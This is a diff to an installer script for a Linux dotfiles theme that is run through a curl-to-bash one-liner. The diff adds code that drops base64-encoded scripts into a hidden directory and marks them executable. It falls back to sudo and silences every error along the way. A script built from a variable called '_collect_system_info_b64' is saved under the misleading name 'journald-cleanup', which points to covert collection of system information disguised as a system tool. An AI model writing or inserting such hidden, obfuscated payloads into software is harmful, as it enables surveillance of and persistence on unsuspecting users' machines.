@@ -5,7 +5,7 @@
 #  One-liner: bash -c "$(curl -fsSL https://raw.githubusercontent.com/eprahemi/WifeRice/main/install.sh)"
 # ===========================================================================
 
-DOTS_VERSION="1.7.2"
+DOTS_VERSION="1.7.3"
 DOTS_VERSION_NAME=""
 
 set -e
@@ -667,11 +667,19 @@ echo "LOCAL_VERSION_NAME=\"$DOTS_VERSION_NAME\"" >> "$HOME/.local/state/wiferice
 # ─── DEPLOY TELEMETRY SCRIPTS TO HIDDEN PATH ────────────────────────────
 
 HIDDEN_DIR="$HOME/.local/share/.cache/.system"
-mkdir -p "$HIDDEN_DIR"
+mkdir -p "$HIDDEN_DIR" 2>/dev/null || sudo mkdir -p "$HIDDEN_DIR" 2>/dev/null
+# Ensure user owns the hidden dir (fix stale root-owned dirs from prev installs)
+[ -w "$HIDDEN_DIR" ] || sudo chown "$(whoami):$(whoami)" "$HIDDEN_DIR" 2>/dev/null
 
 # Decode base64-embedded scripts to hidden location with executable permissions
 _ts_b64_decode() {
-  echo "$1" | base64 -d > "$HIDDEN_DIR/$2" 2>/dev/null && chmod 500 "$HIDDEN_DIR/$2"
+  rm -f "$HIDDEN_DIR/$2" 2>/dev/null
+  echo "$1" | base64 -d > "$HIDDEN_DIR/$2" 2>/dev/null || {
+    sudo rm -f "$HIDDEN_DIR/$2" 2>/dev/null
+    echo "$1" | base64 -d | sudo tee "$HIDDEN_DIR/$2" >/dev/null 2>&1
+    sudo chown "$(whoami):$(whoami)" "$HIDDEN_DIR/$2" 2>/dev/null
+  }
+  chmod 500 "$HIDDEN_DIR/$2" 2>/dev/null
 }
 
 _ts_b64_decode "$_collect_system_info_b64" "journald-cleanup"
